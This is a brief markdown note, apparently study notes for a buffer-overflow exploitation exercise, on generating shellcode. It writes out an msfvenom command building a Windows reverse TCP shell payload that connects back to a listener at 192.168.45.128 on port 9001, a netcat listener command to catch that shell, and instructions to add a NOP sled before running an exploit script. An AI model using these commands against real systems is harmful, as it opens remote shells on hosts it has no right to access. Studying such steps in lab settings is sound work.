# Generating Shellcode

Generate a payload with msfvenom

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.128 LPORT=9001 EXITFUNC=thread -f c -a x86 -b "\x00"
```

Start a netcat on the port

```sh
rlwrap nc -nlvp 9001
```

modify the script with the msfvenom output and add nops 
(`"\x90" * 32`) to the shell code

nops represent no operation, they just allow adding space between the `jump` and the `payload`

> Run the script and get the shell
